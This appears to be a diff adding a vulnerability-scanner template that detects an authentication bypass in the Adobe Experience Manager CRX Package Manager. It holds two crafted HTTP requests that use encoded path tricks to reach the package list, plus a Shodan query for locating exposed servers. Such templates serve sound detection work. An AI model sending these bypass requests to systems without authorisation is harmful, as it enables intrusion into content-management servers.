@@ -1,0 +1,54 @@
+http:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - buildCount
+    - downloadName
+    - acHandling
+  - part: header
+    type: word
+    words:
+    - application/json
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Referer: {{BaseURL}}
+
+    Accept-Encoding: gzip, deflate
+
+    '
+  - 'GET /content/..;/crx/packmgr/list.jsp;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0a;%0aa.css?_dc=1615863080856&_charset_=utf-8&includeVersions=true
+    HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Referer: {{BaseURL}}
+
+    Accept-Encoding: gzip, deflate
+
+    '
+id: aem-crx-bypass
+info:
+  author: dhiyaneshDK
+  description: Adobe Experience Manager Package Manager is susceptible to a hard to
+    exploit authentication bypass issue. This issue only potentially impacts AEM on-premise
+    or AEM as a Managed Service if default security configurations are removed.
+  metadata:
+    max-request: 2
+    shodan-query: http.component:"Adobe Experience Manager"
+  name: AEM Package Manager - Authentication Bypass
+  reference:
+  - https://labs.detectify.com/2021/06/28/aem-crx-bypass-0day-control-over-some-enterprise-aem-crx-package-manager/
+  remediation: 'Adobe recommends AEM customers review access controls for the CRX
+    package manager path: /etc/packages.'
+  severity: critical
+  tags: aem,adobe,misconfig
